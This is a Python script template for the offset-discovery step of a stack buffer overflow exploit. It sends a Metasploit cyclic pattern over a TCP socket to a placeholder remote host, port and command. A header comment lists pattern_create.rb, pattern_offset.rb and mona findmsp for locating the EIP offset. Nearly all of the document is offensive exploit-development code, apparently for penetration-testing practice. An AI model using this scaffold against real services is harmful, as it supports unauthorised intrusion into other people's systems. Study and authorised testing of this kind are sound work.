#!/usr/bin/python

import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
buf_totlen = <buffer_length>

"""
##########################################################
 Offset

    locate pattern_create.rb

    pattern_create.rb -l 3000

    !mona findmsp

        OR

	pattern_offset.rb -q <characters in EIP>

##########################################################    
"""


buf = "MSF Pattern" # Paste the msfvenom pattern in here
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()




